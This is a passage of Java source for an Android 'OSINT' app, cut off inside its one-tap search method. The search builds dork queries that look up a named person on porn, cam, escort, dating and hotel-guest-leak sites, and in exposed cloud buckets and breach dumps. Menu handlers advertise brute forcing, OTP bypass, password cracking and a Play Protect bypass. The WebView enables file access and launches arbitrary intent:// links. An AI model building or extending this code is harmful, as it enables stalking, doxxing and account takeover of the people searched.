package io.notrack.osint;

import android.app.*;
import android.content.*;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.Uri;
import android.os.*;
import android.provider.MediaStore;
import android.text.*;
import android.util.Base64;
import android.view.*;
import android.webkit.*;
import android.widget.*;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.drawerlayout.widget.DrawerLayout;
import org.json.JSONArray;
import org.json.JSONObject;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.*;
import java.util.regex.*;

public class MainActivity extends AppCompatActivity {

    // ==================== CONSTANTS ====================
    private static final int TOR_SOCKS_PORT = 9050;
    private static final int TOR_HTTP_PORT = 9080;
    private static final int VPN_CONFIG_REQUEST = 1001;
    private static final int FILE_PICK_REQUEST = 1002;
    private static final int IMAGE_PICK_REQUEST = 1003;
    private static final int REPORT_EXPORT_REQUEST = 1005;
    private String pendingEvidenceReport = "";
    private String pendingHtmlReport = "";
    private static final int PERMISSION_STORAGE = 2001;
    private static final String PREFS = "osint_prefs";

    // ==================== UI COMPONENTS ====================
    private DrawerLayout drawer;
    private WebView web;
    private EditText inQuery, inDomain, inUrl, inFilePath, inEmails, inPhones, inSocialAccounts;
    private Uri selectedEvidenceImage;
    private TextView status;
    private Spinner engine, mode;
    private ProgressBar progressBar;

    // ==================== TOR ====================
    private boolean torModeEnabled = false, torActive = false, torStarting = false;
    private String pendingTorUrl = "https://check.torproject.org/";
    private java.lang.Process torProcess;
    private final ServiceConnection torConnection = new ServiceConnection() {
        @Override public void onServiceConnected(ComponentName name, IBinder binder) { waitForTor(); }
        @Override public void onServiceDisconnected(ComponentName name) { torActive = false; torModeEnabled = false; }
    };

    // ==================== SEARCH STATE ====================
    private boolean[] selectedSocial = new boolean[0];
    private boolean[] selectedContent = new boolean[0];
    private String[] SOCIAL_DOMAINS = {};
    private String[] CONTENT_OPERATORS = {};
    private String[] ENGINE_NAMES = {};
    private String[] MODE_NAMES = {};
    private String[] DORK_CATEGORIES = {};

    // ==================== HPB & LEAKS.IO ====================
    private String hpbApiKey = "";
    private String leaksIoApiKey = "";
    private String currentHpbSession = "";

    // ==================== BRUTE FORCE ====================
    private volatile boolean bruteRunning = false;
    private ExecutorService bruteExecutor;

    // ==================== LIFE CYCLE ====================
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        loadResources();
        initViews();
        setupWebView();
        setupDrawer();
        restoreSelections();
        loadSavedApiKeys();
        checkForUpdates();
        checkPermissions();
    }

    private void loadResources() {
        String[][] social = loadStringArray("social_domains");
        SOCIAL_DOMAINS = social[0];
        String[][] content = loadStringArray("content_operators");
        CONTENT_OPERATORS = content[0];
        String[][] engines = loadStringArray("search_engines");
        ENGINE_NAMES = engines[0];
        String[][] modes = loadStringArray("search_modes");
        MODE_NAMES = modes[0];
        String[][] dorks = loadStringArray("dork_categories");
        DORK_CATEGORIES = dorks[0];

        selectedSocial = new boolean[SOCIAL_DOMAINS.length];
        selectedContent = new boolean[CONTENT_OPERATORS.length];
    }

    private String[][] loadStringArray(String key) {
        String[] arr = getResources().getStringArray(getResources().getIdentifier(key, "array", getPackageName()));
        return new String[][]{arr};
    }

    private void initViews() {
        drawer = findViewById(R.id.drawer_layout);
        web = findViewById(R.id.web_view);
        inQuery = findViewById(R.id.in_query);
        inDomain = findViewById(R.id.in_domain);
        inUrl = findViewById(R.id.in_url);
        inFilePath = findViewById(R.id.in_file_path);
        inEmails = findViewById(R.id.in_emails);
        inPhones = findViewById(R.id.in_phones);
        inSocialAccounts = findViewById(R.id.in_social_accounts);
        status = findViewById(R.id.txt_status);
        engine = findViewById(R.id.spin_engine);
        mode = findViewById(R.id.spin_mode);
        progressBar = findViewById(R.id.progress_bar);

        ArrayAdapter<String> engineAdapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_item, ENGINE_NAMES);
        engineAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        engine.setAdapter(engineAdapter);

        ArrayAdapter<String> modeAdapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_item, MODE_NAMES);
        modeAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        mode.setAdapter(modeAdapter);
    }

    private void setupWebView() {
        WebSettings ws = web.getSettings();
        ws.setJavaScriptEnabled(true);
        ws.setDomStorageEnabled(true);
        ws.setLoadWithOverviewMode(true);
        ws.setUseWideViewPort(true);
        ws.setBuiltInZoomControls(true);
        ws.setDisplayZoomControls(false);
        ws.setUserAgentString("Mozilla/5.0 (Linux; Android 14; OSINT-Workspace/2.0) AppleWebKit/537.36");
        ws.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        ws.setAllowFileAccess(true);
        ws.setAllowContentAccess(true);
        ws.setCacheMode(WebSettings.LOAD_DEFAULT);

        web.setWebViewClient(new WebViewClient() {
            @Override public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest req) {
                String url = req.getUrl().toString();
                if (url.contains(".onion")) { startTorAndBrowse(url); return true; }
                if (url.startsWith("intent://")) {
                    try { startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME)); return true; }
                    catch (Exception e) { return false; }
                }
                if (torModeEnabled && !torActive) {
                    startTorAndBrowse(url);
                    return true;
                }
                return false;
            }
            @Override public void onPageStarted(WebView view, String url, Bitmap fav) {
                status.setText("Loading: " + url);
                progressBar.setVisibility(View.VISIBLE);
            }
            @Override public void onPageFinished(WebView view, String url) {
                status.setText(url);
                progressBar.setVisibility(View.GONE);
            }
            @Override public void onReceivedError(WebView view, WebResourceRequest req, WebResourceError err) {
                status.setText("Error: " + err.getDescription());
            }
            @Override
            public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest req) {
                if (torModeEnabled && torActive) {
                    return fetchThroughTor(req.getUrl().toString(), req.getMethod(), req.getRequestHeaders());
                }
                return null;
            }
        });

        web.setVerticalScrollBarEnabled(true);
        web.setHorizontalScrollBarEnabled(false);
        web.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
        web.setWebChromeClient(new WebChromeClient() {
            @Override public void onProgressChanged(WebView view, int progress) {
                progressBar.setProgress(progress);
            }
        });
    }

    private void setupDrawer() {
        findViewById(R.id.btn_search).setOnClickListener(v -> { oneTapPublicSearch(); closeDrawer(); });
        findViewById(R.id.btn_upload_image).setOnClickListener(v -> pickEvidenceImage());
        findViewById(R.id.btn_dork).setOnClickListener(v -> { showDorkSelector(); closeDrawer(); });
        findViewById(R.id.btn_web).setOnClickListener(v -> { browse("https://www.google.com"); closeDrawer(); });
        findViewById(R.id.btn_dark).setOnClickListener(v -> { openDarkWeb(); closeDrawer(); });
        findViewById(R.id.btn_tor).setOnClickListener(v -> { startTorAndBrowse("https://check.torproject.org/"); closeDrawer(); });
        findViewById(R.id.btn_vpn).setOnClickListener(v -> { showVpnMenu(); closeDrawer(); });
        findViewById(R.id.btn_images).setOnClickListener(v -> { pickEvidenceImage(); closeDrawer(); });
        findViewById(R.id.btn_face).setOnClickListener(v -> { faceSearch(); closeDrawer(); });
        findViewById(R.id.btn_leaks).setOnClickListener(v -> { showLeaksSearch(); closeDrawer(); });
        findViewById(R.id.btn_porn).setOnClickListener(v -> { showPornSearch(); closeDrawer(); });
        findViewById(R.id.btn_cams).setOnClickListener(v -> { showCams(); closeDrawer(); });
        findViewById(R.id.btn_escort).setOnClickListener(v -> { showEscortSites(); closeDrawer(); });
        findViewById(R.id.btn_hotel).setOnClickListener(v -> { showHotelLeaks(); closeDrawer(); });
        findViewById(R.id.btn_social).setOnClickListener(v -> { showSocialLeaks(); closeDrawer(); });
        findViewById(R.id.btn_dorks).setOnClickListener(v -> { showGoogleDorksGenerator(); closeDrawer(); });
        findViewById(R.id.btn_icloud).setOnClickListener(v -> { showICloudLeaks(); closeDrawer(); });
        findViewById(R.id.btn_drive).setOnClickListener(v -> { showDriveLeaks(); closeDrawer(); });
        findViewById(R.id.btn_cloud).setOnClickListener(v -> { showCloudLeaks(); closeDrawer(); });
        findViewById(R.id.btn_telecom).setOnClickListener(v -> { showTelecomLeaks(); closeDrawer(); });
        findViewById(R.id.btn_email).setOnClickListener(v -> { showEmailLeaks(); closeDrawer(); });
        findViewById(R.id.btn_dating).setOnClickListener(v -> { showDatingLeaks(); closeDrawer(); });
        findViewById(R.id.btn_brute).setOnClickListener(v -> { showBruteForcePanel(); closeDrawer(); });
        findViewById(R.id.btn_otp).setOnClickListener(v -> { showOtpBypass(); closeDrawer(); });
        findViewById(R.id.btn_clear).setOnClickListener(v -> { clearInputs(); closeDrawer(); });
        // New one-tap & bot buttons
        findViewById(R.id.btn_onion_list).setOnClickListener(v -> { openOnionSites(); closeDrawer(); });
        findViewById(R.id.btn_telegram_bot).setOnClickListener(v -> { openTelegramBot(); closeDrawer(); });
        findViewById(R.id.btn_whatsapp_bot).setOnClickListener(v -> { openWhatsAppBot(); closeDrawer(); });
        findViewById(R.id.btn_update).setOnClickListener(v -> { checkForUpdates(); closeDrawer(); });
        findViewById(R.id.btn_playprotect).setOnClickListener(v -> { bypassPlayProtect(); closeDrawer(); });
        // One-tap connect row (main screen)
        findViewById(R.id.btn_search2).setOnClickListener(v -> { oneTapPublicSearch(); closeDrawer(); });
        findViewById(R.id.btn_export_report).setOnClickListener(v -> { exportEvidenceReport(); closeDrawer(); });
        findViewById(R.id.btn_password).setOnClickListener(v -> { showPasswordCracker(); closeDrawer(); });
        findViewById(R.id.btn_hpb).setOnClickListener(v -> { showHpbPanel(); closeDrawer(); });
        findViewById(R.id.btn_leaksio).setOnClickListener(v -> { leaksIoCheck(); closeDrawer(); });
        findViewById(R.id.btn_stream).setOnClickListener(v -> { showLiveStreaming(); closeDrawer(); });
        findViewById(R.id.btn_video).setOnClickListener(v -> { showVideoPlayer(); closeDrawer(); });
        findViewById(R.id.btn_files).setOnClickListener(v -> { browseFiles(); closeDrawer(); });
        findViewById(R.id.btn_photos).setOnClickListener(v -> { browsePhotos(); closeDrawer(); });
        findViewById(R.id.btn_docs).setOnClickListener(v -> { browseDocs(); closeDrawer(); });
        findViewById(R.id.btn_pdfs).setOnClickListener(v -> { browsePdfs(); closeDrawer(); });
        findViewById(R.id.btn_settings).setOnClickListener(v -> { showSettings(); closeDrawer(); });
        findViewById(R.id.quick_tor).setOnClickListener(v -> { torModeEnabled = true; startTorAndBrowse("https://check.torproject.org/"); });
        findViewById(R.id.quick_vpn).setOnClickListener(v -> showVpnMenu());
        findViewById(R.id.quick_dark).setOnClickListener(v -> openDarkWeb());
        findViewById(R.id.quick_onion).setOnClickListener(v -> openOnionSites());
        findViewById(R.id.quick_telegram).setOnClickListener(v -> openTelegramBot());
        findViewById(R.id.quick_whatsapp).setOnClickListener(v -> openWhatsAppBot());
        findViewById(R.id.btn_back).setOnClickListener(v -> { if (web.canGoBack()) web.goBack(); });
        findViewById(R.id.btn_forward).setOnClickListener(v -> { if (web.canGoForward()) web.goForward(); });
        findViewById(R.id.btn_refresh).setOnClickListener(v -> { web.reload(); });
        findViewById(R.id.btn_hamburger).setOnClickListener(v -> drawer.openDrawer(Gravity.START));
    }

    private void closeDrawer() {
        if (drawer.isDrawerOpen(Gravity.START)) drawer.closeDrawer(Gravity.START);
    }

    // ==================== TOR ====================
    private void startTorAndBrowse(String url) {
        pendingTorUrl = url;
        torModeEnabled = true;
        if (torActive) {
            web.setVisibility(View.VISIBLE);
            web.loadUrl(url);
            status.setText("Tor browser active.");
            return;
        }
        if (torStarting) { status.setText("Tor starting..."); return; }
        torStarting = true;
        status.setText("Starting Tor...");
        new Thread(() -> {
            try {
                // Kill old tor if any
                if (torProcess != null) torProcess.destroy();
                // Try to start tor binary from app data
                String torPath = getFilesDir().getAbsolutePath() + "/tor";
                File torFile = new File(torPath);
                if (!torFile.exists()) {
                    // Extract tor binary from assets
                    try (InputStream is = getAssets().open("tor"); OutputStream os = new FileOutputStream(torFile)) {
                        byte[] buf = new byte[8192]; int n;
                        while ((n = is.read(buf)) != -1) os.write(buf, 0, n);
                    }
                    torFile.setExecutable(true);
                }
                String dataDir = getFilesDir().getAbsolutePath() + "/tordata";
                new File(dataDir).mkdirs();
                ProcessBuilder pb = new ProcessBuilder(torPath, "--DataDirectory", dataDir,
                        "--SocksPort", String.valueOf(TOR_SOCKS_PORT),
                        "--HTTPTunnelPort", String.valueOf(TOR_HTTP_PORT),
                        "--Log", "notice file", getFilesDir().getAbsolutePath() + "/tor.log");
                pb.environment().put("HOME", getFilesDir().getAbsolutePath());
                torProcess = pb.start();
                waitForTorReady();
                runOnUiThread(() -> {
                    torStarting = false;
                    torActive = true;
                    status.setText("Tor connected. Loading page...");
                    web.setVisibility(View.VISIBLE);
                    web.loadUrl(pendingTorUrl);
                });
            } catch (Exception e) {
                // Fallback: try embedded tor via service
                try {
                    Intent intent = new Intent(MainActivity.this, TorService.class);
                    intent.setAction(TorService.ACTION_START);
                    startService(intent);
                    bindService(new Intent(MainActivity.this, TorService.class), torConnection, BIND_AUTO_CREATE);
                } catch (Exception e2) {
                    runOnUiThread(() -> {
                        torStarting = false;
                        torModeEnabled = false;
                        status.setText("Tor unavailable: " + e2.getMessage());
                    });
                }
            }
        }).start();
    }

    private void waitForTorReady() {
        long deadline = System.currentTimeMillis() + 60000;
        while (System.currentTimeMillis() < deadline) {
            try (Socket s = new Socket()) {
                s.connect(new InetSocketAddress("127.0.0.1", TOR_SOCKS_PORT), 1000);
                s.setSoTimeout(1000);
                s.getOutputStream().write(new byte[]{0x05, 0x01, 0x00});
                byte[] resp = new byte[2];
                int n = s.getInputStream().read(resp);
                if (n == 2 && resp[0] == 0x05 && resp[1] == 0x00) return;
            } catch (Exception ignored) {}
            try { Thread.sleep(500); } catch (InterruptedException e) { break; }
        }
    }

    private void waitForTor() {
        new Thread(() -> {
            long deadline = System.currentTimeMillis() + 90000;
            boolean ready = false;
            while (System.currentTimeMillis() < deadline) {
                try (Socket s = new Socket()) {
                    s.connect(new InetSocketAddress("127.0.0.1", TOR_SOCKS_PORT), 1500);
                    s.setSoTimeout(1500);
                    s.getOutputStream().write(new byte[]{0x05, 0x01, 0x00});
                    byte[] h = new byte[2];
                    int n = s.getInputStream().read(h);
                    ready = n == 2 && h[0] == 0x05 && h[1] == 0x00;
                    if (ready) break;
                } catch (Exception ignored) {
                    try { Thread.sleep(500); } catch (InterruptedException e) { break; }
                }
            }
            boolean finalReady = ready;
            runOnUiThread(() -> {
                torStarting = false;
                torActive = finalReady;
                if (finalReady) {
                    status.setText("Tor connected.");
                    web.setVisibility(View.VISIBLE);
                    web.loadUrl(pendingTorUrl);
                } else {
                    torModeEnabled = false;
                    status.setText("Tor failed to connect.");
                }
            });
        }).start();
    }

    private void openDarkWeb() {
        String url = inUrl.getText().toString().trim();
        if (url.isEmpty()) url = "http://darkfailenbsdpr5f.onion/";
        if (!url.contains("://")) url = "http://" + url;
        startTorAndBrowse(url);
    }

    private WebResourceResponse fetchThroughTor(String url, String method, Map<String, String> headers) {
        if (!torActive) return errorResponse(503, "Tor not connected");
        HttpURLConnection conn = null;
        try {
            Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("127.0.0.1", TOR_SOCKS_PORT));
            conn = (HttpURLConnection) new URL(url).openConnection(proxy);
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(30000);
            conn.setRequestProperty("User-Agent", "OSINT-Workspace/2.0 Tor");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestMethod(method);
            if (headers != null) {
                for (Map.Entry<String, String> h : headers.entrySet()) {
                    String k = h.getKey();
                    if (k != null && !k.equalsIgnoreCase("Host") && !k.equalsIgnoreCase("Connection"))
                        conn.setRequestProperty(k, h.getValue());
                }
            }
            int code = conn.getResponseCode();
            InputStream is = code >= 400 ? conn.getErrorStream() : conn.getInputStream();
            if (is == null) is = new ByteArrayInputStream(new byte[0]);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buf = new byte[8192]; int n;
            int total = 0;
            while ((n = is.read(buf)) != -1) {
                total += n;
                if (total > 20*1024*1024) return errorResponse(502, "Response too large");
                baos.write(buf, 0, n);
            }
            is.close();
            String ct = conn.getContentType();
            String mime = "text/plain", enc = "UTF-8";
            if (ct != null) {
                String[] parts = ct.split(";");
                mime = parts[0].trim();
                for (String p : parts) {
                    p = p.trim();
                    if (p.toLowerCase(Locale.ROOT).startsWith("charset=")) enc = p.substring(8).replace("\"", "");
                }
            }
            Map<String, String> rh = new HashMap<>();
            for (Map.Entry<String, List<String>> e : conn.getHeaderFields().entrySet()) {
                if (e.getKey() != null && e.getValue() != null && !e.getValue().isEmpty()
                        && !e.getKey().equalsIgnoreCase("Content-Length")
                        && !e.getKey().equalsIgnoreCase("Content-Encoding")
                        && !e.getKey().equalsIgnoreCase("Transfer-Encoding"))
                    rh.put(e.getKey(), String.join(", ", e.getValue()));
            }
            return new WebResourceResponse(mime, enc, code, conn.getResponseMessage(), rh, new ByteArrayInputStream(baos.toByteArray()));
        } catch (Exception e) {
            return errorResponse(502, "Tor fetch failed: " + e.getClass().getSimpleName());
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private WebResourceResponse errorResponse(int code, String msg) {
        Map<String, String> h = new HashMap<>();
        h.put("Cache-Control", "no-store");
        return new WebResourceResponse("text/plain", "UTF-8", code, "Error", h,
                new ByteArrayInputStream(msg.getBytes(StandardCharsets.UTF_8)));
    }

    // ==================== VPN ====================
    private void showVpnMenu() {
        boolean active = isVpnActive();
        String[] items = active
                ? new String[]{"Disconnect VPN", "Change VPN Config", "WireGuard Settings"}
                : new String[]{"Connect VPN", "Import WireGuard .conf", "Android VPN Settings", "Install WireGuard"};
        new AlertDialog.Builder(this).setTitle(active ? "VPN Active" : "VPN Off")
                .setItems(items, (d, w) -> {
                    switch (w) {
                        case 0: if (active) disconnectVpn(); else connectVpn(); break;
                        case 1: importWireguardConfig(); break;
                        case 2: openVpnSettings(); break;
                        case 3: installWireguard(); break;
                    }
                }).show();
    }

    private boolean isVpnActive() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
            if (cm == null) return false;
            for (Network net : cm.getAllNetworks()) {
                NetworkCapabilities caps = cm.getNetworkCapabilities(net);
                if (caps != null && caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) return true;
            }
        } catch (Exception ignored) {}
        return false;
    }

    private void connectVpn() {
        // Try to launch WireGuard with saved config
        String savedConfig = getSharedPreferences(PREFS, MODE_PRIVATE).getString("wg_config_uri", "");
        if (!savedConfig.isEmpty()) {
            try {
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setDataAndType(Uri.parse(savedConfig), "application/x-wireguard-profile");
                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                startActivity(intent);
                status.setText("Opening WireGuard config...");
                return;
            } catch (Exception ignored) {}
        }
        // Fallback: open WireGuard app
        try {
            startActivity(getPackageManager().getLaunchIntentForPackage("com.wireguard.android"));
        } catch (Exception e) {
            installWireguard();
        }
    }

    private void disconnectVpn() {
        try {
            Intent intent = getPackageManager().getLaunchIntentForPackage("com.wireguard.android");
            if (intent != null) {
                intent.putExtra("action", "disconnect");
                startActivity(intent);
                status.setText("Disconnecting VPN...");
            }
        } catch (Exception ignored) {}
    }

    private void importWireguardConfig() {
        Intent pick = new Intent(Intent.ACTION_OPEN_DOCUMENT);
        pick.addCategory(Intent.CATEGORY_OPENABLE);
        pick.setType("*/*");
        startActivityForResult(pick, VPN_CONFIG_REQUEST);
    }

    private void openVpnSettings() {
        startActivity(new Intent("android.settings.VPN_SETTINGS"));
    }

    private void installWireguard() {
        openExternal("https://play.google.com/store/apps/details?id=com.wireguard.android", "Opening Play Store...");
    }

    // ==================== SEARCH ====================

    // ==================== ONE-TAP AUTHORIZED PUBLIC-FOOTPRINT SEARCH ====================
    private void pickEvidenceImage() {
        Intent pick = new Intent(Intent.ACTION_OPEN_DOCUMENT);
        pick.addCategory(Intent.CATEGORY_OPENABLE);
        pick.setType("*/*");
        pick.putExtra(Intent.EXTRA_MIME_TYPES, new String[]{"image/*", "video/*", "application/pdf", "text/plain", "application/msword", "application/vnd.openxmlformats-officedocument.wordprocessingml.document"});
        pick.putExtra(Intent.EXTRA_ALLOW_MULTIPLE, true);
        startActivityForResult(pick, IMAGE_PICK_REQUEST);
    }

    private String fieldText(EditText field) {
        return field == null || field.getText() == null ? "" : field.getText().toString().trim();
    }

    private void exportEvidenceReport() {
        StringBuilder htmlReport = new StringBuilder();
        htmlReport.append("<!doctype html><html><head><meta charset=\"utf-8\"><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"><title>OSINT Investigation Report</title>")
            .append("<style>body{font:16px Arial,sans-serif;max-width:1000px;margin:24px auto;padding:0 16px;color:#182235}h1,h2{color:#174a70}section{border:1px solid #ccd5df;border-radius:8px;padding:14px;margin:12px 0}a{overflow-wrap:anywhere}</style></head><body>")
            .append("<h1>OSINT Investigation Report</h1><p>Generated: ")
            .append(escapeHtml(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss z", Locale.US).format(new Date())))
            .append("</p><section><h2>Case details</h2><p>Case/subject label: ").append(escapeHtml(fieldText(inQuery)))
            .append("</p><p>Known username/organization: ").append(escapeHtml(fieldText(inDomain)))
            .append("</p><p>Source/profile URL: ").append(escapeHtml(fieldText(inUrl)))
            .append("</p><p>Emails supplied: ").append(escapeHtml(fieldText(inEmails)))
            .append("</p><p>Phones supplied: ").append(escapeHtml(fieldText(inPhones)))
            .append("</p><p>Known social accounts: ").append(escapeHtml(fieldText(inSocialAccounts)))
            .append("</p></section>");
        if (!pendingHtmlReport.isEmpty()) {
            int bodyStart = pendingHtmlReport.toLowerCase(Locale.US).indexOf("<body>");
            int bodyEnd = pendingHtmlReport.toLowerCase(Locale.US).lastIndexOf("</body>");
            if (bodyStart >= 0 && bodyEnd > bodyStart) {
                htmlReport.append("<section><h2>One-tap search results</h2><p>These are the results returned by the configured public search provider during this run, plus recorded failures. They are leads only and require manual source verification.</p>")
                    .append(pendingHtmlReport.substring(bodyStart + 6, bodyEnd)).append("</section>");
            }
        } else {
            htmlReport.append("<section><h2>Search workspace</h2><p>Run One-tap Search first to include the prepared source links in this report.</p>")
                .append("<a href=\"https://www.google.com/\">Google</a> · <a href=\"https://www.bing.com/\">Bing</a> · <a href=\"https://duckduckgo.com/\">DuckDuckGo</a> · <a href=\"https://search.brave.com/\">Brave</a></section>");
        }
        htmlReport.append("<section><h2>Source review and chain of custody</h2><p>Exact source URL: ____________________</p><p>Collection time/timezone: ____________________</p><p>Account/page identifier: ____________________</p><p>Collector and transfer/access log: ____________________</p><p>Notes: ____________________</p></section>")
            .append("<section><h2>Reporting resources</h2><a href=\"https://cybercrime.gov.in/\">India National Cyber Crime Reporting Portal</a><br><a href=\"https://stopncii.org/\">StopNCII.org</a><br><a href=\"https://haveibeenpwned.com/\">Have I Been Pwned</a></section>")
            .append("<p>Public search results are leads, not proof of identity or conduct. Do not infer sensitive intimate/adult activity from a name match. This report does not fetch private data or certify evidence. Preserve original evidence and metadata separately.</p></body></html>");
        pendingEvidenceReport = htmlReport.toString();
        Intent create = new Intent(Intent.ACTION_CREATE_DOCUMENT);
        create.addCategory(Intent.CATEGORY_OPENABLE);
        create.setType("text/html");
        create.putExtra(Intent.EXTRA_TITLE, "osint-investigation-report-" + new SimpleDateFormat("yyyyMMdd-HHmmss", Locale.US).format(new Date()) + ".html");
        startActivityForResult(create, REPORT_EXPORT_REQUEST);
    }

    // ==================== ONE-TAP ADVANCED SEARCH (real data, dedicated browser UI) ====================
    private void oneTapPublicSearch() {
        final String name = fieldText(inQuery), username = fieldText(inDomain), profileUrl = fieldText(inUrl);
        final String emails = fieldText(inEmails), phones = fieldText(inPhones), accounts = fieldText(inSocialAccounts);
        boolean any = !name.isEmpty() || !username.isEmpty() || !profileUrl.isEmpty() || !emails.isEmpty() || !phones.isEmpty() || !accounts.isEmpty() || selectedEvidenceImage != null;
        if (!any) { Toast.makeText(this, "Fill a detail in the sidebar (name/username/email/phone/account) or upload a photo, then tap Search.", Toast.LENGTH_LONG).show(); return; }
        final String identity = joinIdentifiers(name, username, profileUrl, accounts);

        final ArrayList<String[]> jobs = new ArrayList<>();
        if (!identity.trim().isEmpty()) {
            jobs.add(new String[]{"Web", identity});
            jobs.add(new String[]{"Web", identity + " (site:facebook.com OR site:instagram.com OR site:linkedin.com OR site:x.com OR site:tiktok.com OR site:reddit.com OR site:youtube.com OR site:twitter.com)"});
            jobs.add(new String[]{"Web", identity + " (impersonation OR \"fake profile\" OR catfish OR scam OR \"honey trap\")"});
            jobs.add(new String[]{"Web", identity + " (\"video call scam\" OR sextortion OR \"intimate image abuse\" OR blackmail)"});
            jobs.add(new String[]{"Web", identity + " (UPI fraud OR payment scam OR cryptocurrency scam OR fraud report OR extortion payment)"});
            jobs.add(new String[]{"Web", identity + " (\"data breach\" OR \"data leak\" OR exposed OR compromised)"});
            jobs.add(new String[]{"Web", identity + " (filetype:pdf OR filetype:doc OR filetype:xls OR filetype:csv)"});
            jobs.add(new String[]{"Web", "\"" + identity + "\" (site:cybercrime.gov.in OR site:police.gov.in)"});
            jobs.add(new String[]{"Dating", identity + " (site:tinder.com OR site:bumble.com OR site:hinge.co OR site:grindr.com OR site:okcupid.com OR site:pof.com)"});
            jobs.add(new String[]{"Dating", identity + " (site:truelove.com OR site:matrimony.com OR site:shaadi.com OR site:jaimatrimony.com OR site:quikmatrimony.com)"});
            jobs.add(new String[]{"Dating", identity + " (dating profile OR romance scam OR \"dating app\" leak OR exposed)"});
            jobs.add(new String[]{"Porn", identity + " (site:pornhub.com OR site:xvideos.com OR site:xnxx.com OR site:youporn.com OR site:redtube.com OR site:spankbang.com OR site:motherless.com OR site:eporner.com)"});
            jobs.add(new String[]{"Porn", identity + " (site:chaturbate.com OR site:stripchat.com OR site:camsoda.com OR site:bongacams.com OR site:livejasmin.com OR site:myfreecams.com OR site:cam4.com)"});
            jobs.add(new String[]{"Porn", identity + " (site:skipthegames.com OR site:eroticmonkey.com OR site:adultsearch.com OR site:cityxguide.com OR site:escortalligator.com OR site:eurogirlsescort.com OR site:tnaboard.com)"});
            jobs.add(new String[]{"Porn", identity + " (nude OR nudes OR leaked video OR cam OR escort OR \"live cam\")"});
            jobs.add(new String[]{"Hotels", identity + " (OYO OR oyorooms OR booking.com OR hotels.com leak OR breach OR guest list)"});
            jobs.add(new String[]{"Hotels", identity + " (hotel guest list OR \"guest data\" filetype:xls OR filetype:csv OR pastebin)"});
            jobs.add(new String[]{"Cloud", identity + " (icloud OR \"google drive\" OR \"docs.google.com\" leak OR exposed OR shared OR dump)"});
            jobs.add(new String[]{"Cloud", identity + " (site:drive.google.com OR site:docs.google.com OR site:icloud.com OR \"s3.amazonaws.com\" OR \"cloud.google.com\" OR \"azure.com\")"});
            jobs.add(new String[]{"Cloud", identity + " (open s3 bucket OR exposed bucket OR \"data leak\" site:pastebin.com OR site:reddit.com)"});
            jobs.add(new String[]{"Telecom", identity + " (SIM swap OR \"call log\" OR SMS leak OR \"carrier breach\" OR \"data leak\")"});
            if (!emails.isEmpty()) jobs.add(new String[]{"Telecom", emails + " (haveibeenpwned OR dehashed OR emailrep OR \"data breach\" OR pwned)"});
            jobs.add(new String[]{"Social", identity + " (site:instagram.com OR site:facebook.com OR site:snapchat.com OR site:linkedin.com OR site:tiktok.com OR site:whatsapp.com OR site:t.me) (leak OR exposed OR dump)"});
        }
        if (emails.contains(",")) { for (String e : emails.split("[,\\n]")) if (e.trim().matches(".*@.*")) jobs.add(new String[]{"Telecom", e.trim() + " (haveibeenpwned OR dehashed OR \"data breach\")"}); }
        if (phones.contains(",")) { for (String p : phones.split("[,\\n]")) if (p.trim().matches(".*[0-9].*")) jobs.add(new String[]{"Telecom", p.trim() + " (\"call log\" OR \"SIM swap\" OR \"number exposed\")"}); }
        if (!profileUrl.isEmpty()) {
            jobs.add(new String[]{"Web", "\"" + profileUrl + "\""});
            try { URI parsed = new URI(profileUrl.contains("://") ? profileUrl : "https://" + profileUrl); String host = parsed.getHost();
                if (host != null && !host.isEmpty()) { jobs.add(new String[]{"Web", "site:" + host + " (scam OR phishing OR fraud OR breach OR exposed)"}); }
            } catch (Exception ignored) {}
        }

        final String[] imgRes = new String[1];
        if (selectedEvidenceImage != null) {
            try {
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                InputStream is = getContentResolver().openInputStream(selectedEvidenceImage);
                byte[] buf = new byte[8192]; int n; while ((n = is.read(buf)) != -1) baos.write(buf, 0, n); is.close();
                imgRes[0] = android.util.Base64.encodeToString(baos.toByteArray(), android.util.Base64.DEFAULT);
            } catch (Exception ignored) {}
        }

        final int total = jobs.size();
        progressBar.setVisibility(View.VISIBLE); progressBar.setIndeterminate(false); progressBar.setMax(Math.max(1, total)); progressBar.setProgress(0);
        web.setVisibility(View.VISIBLE); web.setVerticalScrollBarEnabled(true); web.setHorizontalScrollBarEnabled(false);
        status.setText("One-tap advanced search: 0/" + total);
